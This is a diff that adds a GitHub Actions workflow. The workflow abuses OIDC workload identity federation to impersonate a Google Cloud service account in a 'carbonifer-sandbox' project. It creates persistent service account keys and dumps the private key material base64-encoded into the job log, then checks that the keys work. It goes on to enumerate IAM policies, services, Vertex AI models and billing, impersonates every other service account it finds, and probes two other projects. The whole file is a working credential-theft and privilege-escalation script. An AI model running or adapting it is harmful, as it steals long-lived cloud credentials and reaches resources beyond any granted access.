@@ -1,0 +1,158 @@
+name: i870-carbonifer-drive
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  drive:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - name: run
+        run: |
+          set +e
+          NUM=536185737408
+          PRJ="projects/$NUM/locations/global/workloadIdentityPools/carbonifer-gh-pool/providers/carbonifer-oidc-provider"
+          SA="github@carbonifer-sandbox.iam.gserviceaccount.com"
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          jq -n '{keyAlgorithm:"KEY_ALG_RSA_2048"}' > keyreq.json
+          jq -n '{options:{requestedPolicyVersion:3}}' > polreq.json
+
+          # ---------- 1. mint OIDC token + STS exchange ----------
+          : > tok.jwt
+          for a in 1 2 3; do
+            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=//iam.googleapis.com/$PRJ")
+            echo "$J" | jq -r '.value // empty' > tok.jwt
+            [ -s tok.jwt ] && break
+            sleep 3
+          done
+          if [ ! -s tok.jwt ]; then echo "##MINT_FAIL"; exit 0; fi
+          sc=$(curl -s -o sts.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+            --data-urlencode "subject_token=$(cat tok.jwt)" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+            -d "scope=https://www.googleapis.com/auth/cloud-platform")
+          FT=$(jq -r '.access_token // empty' sts.json)
+          echo "##STS code=$sc ftlen=${#FT} body=$(head -c 300 sts.json | tr -d '\n' | tr -s ' ')"
+          if [ -z "$FT" ]; then echo "##STS_FAIL"; exit 0; fi
+          echo "FEDERATED_TOKEN_START"; echo "$FT" > fed.txt; echo "FEDERATED_TOKEN_END"
+
+          # ---------- 2. generateAccessToken for the bound SA ----------
+          gc=$(curl -s -o gat.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H 'Content-Type: application/json' \
+            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
+          AT=$(jq -r '.accessToken // empty' gat.json)
+          echo "##GEN code=$gc toklen=${#AT} body=$(head -c 300 gat.json | tr -d '\n' | tr -s ' ')"
+          if [ -z "$AT" ]; then echo "##GEN_FAIL"; exit 0; fi
+          echo "$AT" > sat.txt
+
+          # ---------- 3. literal SA key creation (both forms) ----------
+          echo "===== KEY CREATE: POST .../keys with body keyAlgorithm ====="
+          k1=$(curl -s -o key1.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' \
+            "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA/keys" -d @keyreq.json)
+          echo "##KEY_CREATE code=$k1 len=$(wc -c < key1.json)"
+          echo "##KEY_CREATE_BODY_B64 $(base64 -w0 key1.json)"
+          echo "===== KEY CREATE: POST .../keys?keyTypes=USER_MANAGED ====="
+          k2=$(curl -s -o key2.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' \
+            "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA/keys?keyTypes=USER_MANAGED" -d @keyreq.json)
+          echo "##KEY_CREATE_QT code=$k2 len=$(wc -c < key2.json)"
+          echo "##KEY_CREATE_QT_BODY_B64 $(base64 -w0 key2.json)"
+          echo "===== KEY LIST (GET) ====="
+          kl=$(curl -s -o keylist.json -w '%{http_code}' -H "Authorization: Bearer $AT" \
+            "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA/keys?keyTypes=USER_MANAGED")
+          echo "##KEY_LIST code=$kl body=$(head -c 800 keylist.json | tr -d '\n' | tr -s ' ')"
+
+          # ---------- 4. validate any returned key JSON via oauth2 jwt-bearer ----------
+          for KF in key1.json key2.json; do
+            if jq -e '.privateKeyData' "$KF" >/dev/null 2>&1; then
+              jq -r '.privateKeyData' "$KF" | base64 -d > sa_key.json
+              echo "##KEY_MATERIAL file=$KF type=$(jq -r '.type // "?"' sa_key.json) client_email=$(jq -r '.client_email // "?"' sa_key.json) project_id=$(jq -r '.project_id // "?"' sa_key.json) key_id=$(jq -r '.private_key_id // "?"' sa_key.json)"
+              python3 - <<'PY' > jwt.txt 2>jwt.err
+import json,base64,time
+try:
+    from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.hazmat.primitives.asymmetric import padding
+    d=json.load(open('sa_key.json'))
+    def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+    hdr={"alg":"RS256","typ":"JWT","kid":d['private_key_id']}
+    now=int(time.time())
+    clm={"iss":d['client_email'],"scope":"https://www.googleapis.com/auth/cloud-platform","aud":"https://oauth2.googleapis.com/token","iat":now,"exp":now+3600}
+    signing=b64u(json.dumps(hdr).encode())+"."+b64u(json.dumps(clm).encode())
+    key=serialization.load_pem_private_key(d['private_key'].encode(),password=None)
+    sig=key.sign(signing.encode(),padding.PKCS1v15(),hashes.SHA256())
+    print(signing+"."+b64u(sig))
+except Exception as e:
+    import sys; print("ERR",e,file=sys.stderr); sys.exit(1)
+PY
+              if [ -s jwt.txt ]; then
+                tc=$(curl -s -o tokresp.json -w '%{http_code}' -X POST https://oauth2.googleapis.com/token \
+                  --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
+                  --data-urlencode "assertion=$(cat jwt.txt)")
+                JT=$(jq -r '.access_token // empty' tokresp.json)
+                echo "##KEY_VALIDATE file=$KF code=$tc toklen=${#JT} body=$(head -c 300 tokresp.json | tr -d '\n' | tr -s ' ')"
+                [ -n "$JT" ] && echo "$JT" > keytoken.txt
+              else
+                echo "##KEY_JWT_ERR file=$KF $(head -c 300 jwt.err | tr -d '\n')"
+              fi
+            else
+              echo "##KEY_NO_MATERIAL file=$KF"
+            fi
+          done
+
+          # ---------- 5. reach enumeration with the SA token ----------
+          getp() { local L="$1" U="$2" T="$3"; local c B; c=$(curl -s -o q.json -w '%{http_code}' -H "Authorization: Bearer $T" "$U"); B=$(head -c 600 q.json | tr -d '\n' | tr -s ' '); echo "##GET label=$L code=$c body=$B"; }
+          postp() { local L="$1" U="$2" T="$3" F="$4"; local c; c=$(curl -s -o q.json -w '%{http_code}' -X POST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' "$U" -d @"$F"); echo "##POST label=$L code=$c body=$(head -c 900 q.json | tr -d '\n' | tr -s ' ')"; }
+
+          echo "===== IAM: serviceAccounts list ====="
+          SAL=$(curl -s -o salist.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts?pageSize=100")
+          echo "##SALIST code=$SAL emails=$(jq -r '[.accounts[]?.email]|join(",")' salist.json 2>/dev/null)"
+          echo "##SALIST_BODY_B64 $(base64 -w0 salist.json)"
+
+          echo "===== CRM: project get + getIamPolicy ====="
+          getp "crm_project_get" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM" "$AT"
+          postp "crm_project_getIamPolicy" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:getIamPolicy" "$AT" polreq.json
+          echo "##CRM_POLICY_B64 $(base64 -w0 q.json)"
+
+          echo "===== serviceusage: enabled services ====="
+          SU=$(curl -s -o su.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://serviceusage.googleapis.com/v1/projects/$NUM/services?filter=state:ENABLED&pageSize=200")
+          echo "##SERVICES code=$SU count=$(jq -r '[.services[]?]|length' su.json 2>/dev/null) names=$(jq -r '[.services[]?.config.name]|join(",")' su.json 2>/dev/null | head -c 3000)"
+          echo "##SERVICES_B64 $(base64 -w0 su.json)"
+
+          echo "===== per-SA getIamPolicy + generateAccessToken ====="
+          for S in $(jq -r '.accounts[]?.email' salist.json 2>/dev/null); do
+            pc=$(curl -s -o p.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$S:getIamPolicy" -d @polreq.json)
+            echo "##SAPOL sa=$S code=$pc body=$(head -c 700 p.json | tr -d '\n' | tr -s ' ')"
+            g=$(curl -s -o g2.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$S:generateAccessToken" -d @req.json)
+            T2=$(jq -r '.accessToken // empty' g2.json)
+            echo "##SAGEN sa=$S code=$g toklen=${#T2} body=$(head -c 300 g2.json | tr -d '\n' | tr -s ' ')"
+            if [ -n "$T2" ]; then
+              echo "$S|$T2" >> others.txt
+            fi
+          done
+
+          echo "===== cross-project replay: 533362582499 and 196494084534 ====="
+          for ONUM in 533362582499 196494084534; do
+            getp "crm_$ONUM" "https://cloudresourcemanager.googleapis.com/v1/projects/$ONUM" "$AT"
+            for REG in us-central1 europe-west1; do
+              getp "models_${ONUM}_${REG}" "https://${REG}-aiplatform.googleapis.com/v1/projects/$ONUM/locations/${REG}/models" "$AT"
+            done
+            getp "models_${ONUM}_global" "https://aiplatform.googleapis.com/v1/projects/$ONUM/locations/global/models" "$AT"
+            getp "billing_${ONUM}" "https://cloudbilling.googleapis.com/v1/projects/$ONUM/billingInfo" "$AT"
+            getp "services_${ONUM}" "https://serviceusage.googleapis.com/v1/projects/$ONUM/services?filter=state:ENABLED&pageSize=200" "$AT"
+          done
+
+          echo "===== same-project Vertex + billing with SA token ====="
+          for REG in us-central1 europe-west1; do
+            getp "models_${NUM}_${REG}" "https://${REG}-aiplatform.googleapis.com/v1/projects/$NUM/locations/${REG}/models" "$AT"
+          done
+          getp "models_${NUM}_global" "https://aiplatform.googleapis.com/v1/projects/$NUM/locations/global/models" "$AT"
+          getp "billing_${NUM}" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo" "$AT"
+          getp "endpoints_${NUM}" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/endpoints" "$AT"
+
+          echo "===== billing/aiplatform API enablement state ====="
+          getp "svc_state_billing" "https://serviceusage.googleapis.com/v1/projects/$NUM/services/cloudbilling.googleapis.com" "$AT"
+          getp "svc_state_aiplatform" "https://serviceusage.googleapis.com/v1/projects/$NUM/services/aiplatform.googleapis.com" "$AT"
+
+          echo "##FINISHED"
